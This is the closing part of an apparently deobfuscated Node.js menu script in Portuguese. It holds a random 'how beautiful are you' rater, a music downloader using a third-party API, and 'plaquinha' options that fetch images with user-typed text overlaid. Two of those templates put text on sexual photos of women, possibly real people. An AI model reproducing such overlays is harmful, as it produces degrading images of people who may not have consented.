                                                                                    ) {
                                                                                      bo =
                                                                                        'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                    } else {
                                                                                      if (
                                                                                        boiola ==
                                                                                        61
                                                                                      ) {
                                                                                        bo =
                                                                                          'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                      } else {
                                                                                        if (
                                                                                          boiola ==
                                                                                          62
                                                                                        ) {
                                                                                          bo =
                                                                                            'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                        } else {
                                                                                          if (
                                                                                            boiola ==
                                                                                            63
                                                                                          ) {
                                                                                            bo =
                                                                                              'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                          } else {
                                                                                            if (
                                                                                              boiola ==
                                                                                              64
                                                                                            ) {
                                                                                              bo =
                                                                                                'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                            } else {
                                                                                              if (
                                                                                                boiola ==
                                                                                                65
                                                                                              ) {
                                                                                                bo =
                                                                                                  'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                              } else {
                                                                                                if (
                                                                                                  boiola ==
                                                                                                  66
                                                                                                ) {
                                                                                                  bo =
                                                                                                    'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                                } else {
                                                                                                  if (
                                                                                                    boiola ==
                                                                                                    67
                                                                                                  ) {
                                                                                                    bo =
                                                                                                      'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                                  } else {
                                                                                                    if (
                                                                                                      boiola ==
                                                                                                      68
                                                                                                    ) {
                                                                                                      bo =
                                                                                                        'quer me manipular ss ou nn ? \uD83D\uDE21'
                                                                                                    } else {
                                                                                                      boiola >
                                                                                                        69 &&
                                                                                                        (bo =
                                                                                                          'bó casa?\uD83D\uDE33')
                                                                                                    }
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
      console.log(
        color(
          '\n\n' +
            lindaname +
            ' Você é ' +
            random +
            '% lindo\n\n' +
            bo +
            '\n\n',
          'magenta'
        )
      ),
        await sleep(5000),
        main()
      break
    case 'plaquinha1':
      {
        let _0x1c2132 = readline.question(
          '\n\nDigite seu texto!\nExemplo: venom\n\nDigite seu texto qui: '
        )
        console.clear()
        const _0x18b794 = require('fs')
        buffer =
          'https://raptibef.sirv.com/images%20(3).jpeg?text.0.text=' +
          _0x1c2132 +
          '&text.0.position.gravity=center&text.0.position.x=19%25&text.0.size=45&text.0.color=000000&text.0.opacity=55&text.0.font.family=Crimson%20Text&text.0.font.weight=300&text.0.font.style=italic&text.0.outline.opacity=21'
        axios({
          method: 'get',
          url: buffer,
          responseType: 'stream',
        })
          .then(function (_0x2cccfb) {
            _0x2cccfb.data.pipe(
              _0x18b794.createWriteStream('../plaquinha 1.jpg')
            )
          })
          .catch(function (_0xc1a4be) {
            console.log(_0xc1a4be)
          })
        console.log(
          color(
            '\n\nPlaquinha feita \u2713\n Verifique a na pasta sdcard no seu celular a imagem esta lá\n\n',
            'green'
          )
        )
        await sleep(5000)
        console.clear()
        main()
      }
      break
    case 'plaquinha2':
      {
        let _0x261861 = readline.question(
          '\n\nDigite seu texto!\nExemplo: venom\n\nDigite seu texto qui: '
        )
        console.clear()
        const _0x24f919 = require('fs')
        plaq2 =
          'https://raptibef.sirv.com/images%20(1).jpeg?profile=Zanga%202.0&text.0.text=' +
          _0x261861
        axios({
          method: 'get',
          url: plaq2,
          responseType: 'stream',
        })
          .then(function (_0x3a9936) {
            _0x3a9936.data.pipe(
              _0x24f919.createWriteStream('../plaquinha 2.jpg')
            )
          })
          .catch(function (_0x32102c) {
            console.log(_0x32102c)
          })
        console.log(
          color(
            '\n\nPlaquinha feita \u2713\n Verifique a na pasta sdcard no seu celular a imagem esta lá\n\n',
            'green'
          )
        )
        await sleep(5000)
        console.clear()
        main()
      }
      break
    case 'plaquinha3':
      {
        let _0x159185 = readline.question(
          '\n\nDigite seu texto!\nExemplo: venom\n\nDigite seu texto qui: '
        )
        console.clear()
        const _0x3cf356 = require('fs')
        plaq3 =
          'https://raptibef.sirv.com/images.jpeg?profile=Zanga%203.0&text.0.text=' +
          _0x159185 +
          '&text.0.outline.blur=63'
        axios({
          method: 'get',
          url: plaq3,
          responseType: 'stream',
        })
          .then(function (_0x5972a1) {
            _0x5972a1.data.pipe(
              _0x3cf356.createWriteStream('../plaquinha 3.jpg')
            )
          })
          .catch(function (_0x236b15) {
            console.log(_0x236b15)
          })
        console.log(
          color(
            '\n\nPlaquinha feita \u2713\n Verifique a na pasta sdcard no seu celular a imagem esta lá\n\n',
            'green'
          )
        )
        await sleep(5000)
        console.clear()
        main()
      }
      break
    case 'plaquinha4':
      {
        let _0x663374 = readline.question(
          '\n\nDigite seu texto!\nExemplo: venom\n\nDigite seu texto qui: '
        )
        console.clear()
        const _0x3669de = require('fs')
        plaq4 =
          'https://umethroo.sirv.com/Torcedora-da-sele%C3%A7%C3%A3o-brasileira-nua-mostrando-a-bunda-236x300.jpg?text.0.text=' +
          _0x663374 +
          '&text.0.position.x=-64%25&text.0.position.y=-39%25&text.0.size=25&text.0.color=1b1a1a&text.0.font.family=Architects%20Daughter'
        axios({
          method: 'get',
          url: plaq4,
          responseType: 'stream',
        })
          .then(function (_0xa4691e) {
            _0xa4691e.data.pipe(
              _0x3669de.createWriteStream('../plaquinha 4.jpg')
            )
          })
          .catch(function (_0x508a64) {
            console.log(_0x508a64)
          })
        console.log(
          color(
            '\n\nPlaquinha feita \u2713\n Verifique a na pasta sdcard no seu celular a imagem esta lá\n\n',
            'green'
          )
        )
        await sleep(5000)
        console.clear()
        main()
      }
      break
    case 'plaquinha5':
      {
        let _0x31e11d = readline.question(
          '\n\nDigite seu texto!\nExemplo: venom\n\nDigite seu texto qui: '
        )
        console.clear()
        const _0x22097c = require('fs')
        plaq5 =
          'https://umethroo.sirv.com/peito1.jpg?text.0.text=' +
          _0x31e11d +
          '&text.0.position.x=-4%25&text.0.position.y=-6%25&text.0.size=14&text.0.color=000000&text.0.font.family=Shadows%20Into%20Light&text.0.font.weight=700'
        axios({
          method: 'get',
          url: plaq5,
          responseType: 'stream',
        })
          .then(function (_0x50489e) {
            _0x50489e.data.pipe(_0x22097c.createWriteStream(edit5))
          })
          .catch(function (_0x542ae7) {
            console.log(_0x542ae7)
          })
        console.log(
          color(
            '\n\nPlaquinha feita \u2713\n Verifique a na pasta sdcard no seu celular a imagem esta lá\n\n',
            'green'
          )
        )
        await sleep(5000)
        console.clear()
        main()
      }
      break
    case 'play':
    case 'play-audio':
    case 'play_audio':
      const _0x52b5a1 = require('fs')
      let _0x1a1ada = readline.question(
        '\n\nDesculpe, parece que você não forneceu o nome da música. Você pode usar como exemplo: Vibe broly\n\nDigite o nome da música aqui: '
      )
      console.clear(),
        console.log(color('\n\nBaixando música aguarde...\n\n', 'cyan')),
        _0x2f38da(),
        await sleep(3000),
        (data = await fetchJson(
          'http://sabapi.tech:8090/api/ytsrc/videos?q=' +
            _0x1a1ada +
            '&apikey=' +
            API_KEY_SABRINA
        ))
      const _0x71e5ca = (_0x22e796) => {
        return (
          '\n\n\uD83C\uDFA7 MÚSICA ENCONTRADA \uD83C\uDFA7\n\n,*Título:* ' +
          _0x22e796.resultado[0].title +
          '\n*Descrição:* ' +
          _0x22e796.resultado[0].description +
          '\n*Duração:* ' +
          _0x22e796.resultado[0].timestamp +
          ' | ' +
          _0x22e796.resultado[0].seconds +
          ' segundos.\n*Link:* ' +
          _0x22e796.resultado[0].url +
          '\n\n'
        )
      }
      console.clear(), console.log(color(_0x71e5ca(data), 'blue'))
      const _0x2160ce =
          'http://sabapi.tech:8090/api/dl/ytaudio?url=' +
          data.resultado[0].url +
          '&apikey=' +
          API_KEY_SABRINA,
        _0x4f446f = '../' + data.resultado[0].title + '.mp3'
      axios({
        method: 'get',
        url: _0x2160ce,
        responseType: 'stream',
      })
        .then(function (_0x358539) {
          _0x358539.data.pipe(_0x52b5a1.createWriteStream(_0x4f446f))
        })
        .catch(function (_0x41ed1c) {
          console.log(_0x41ed1c)
        }),
        console.log(
          color(
            '\n\nMúsica baixada coom sucesso\n Verifique a na pasta sdcard no seu celular o áudio esta lá\n\n',
            'green'
          )
        ),
        await sleep(5000),
        console.clear(),
        main()
      break
    default:
      console.log(color('\n Este comando não existe!\n', 'magenta')),
        await sleep(2000),
        main()
      break
  }
}
main()
